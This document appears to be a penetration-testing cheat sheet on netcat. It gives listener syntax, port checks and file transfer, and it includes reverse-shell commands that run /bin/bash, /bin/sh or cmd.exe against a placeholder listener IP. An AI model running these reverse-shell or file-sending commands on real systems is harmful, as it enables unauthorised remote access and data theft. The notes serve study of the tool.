# netcat (nc)

NetCat is a popular remote access tool.
- It has a small footprint so it's portable.
- It can set up a reverse shell easily.
- In Kali the Windows executable is found here: `/usr/share/windows-binaries/nc.exe`

## Listener

```
nc -nvlp 1234
```

**Options:**
- `-n` : numeric-only IP addresses, no DNS
- `-v` : verbose (twice for more verbosity)
- `-l` : listen mode; for in-bound connects
- `p [port]` : port number

## Connect

Connect to a listener from Linux:
```
nc [listener IP] [port] –e /bin/bash
nc [listener IP] [port] –e /bin/sh
```

Connect to a listener from Windows:
```
nc.exe [listener IP] [port] –e cmd.exe
```

## Manually Check Ports

`nc -nv [target ip] [port]`

Nmap will find open ports, and a service version scan will most often provide detailed information about what services (and their versions) are running on those open ports.
- This is not, however, the case all the time. 
- Whenever you see a question mark next to an nmap result, that means nmap is give you a best guess.
- You should always check these items **_manually_** with Netcat.

## File Input/Output

Send output from a listener to a text file:
```
nc -nvlp [port number] > filename.txt
```

Send output from a text file to a remote machine:
```
nc [IP Address] [port] < filename.txt
```
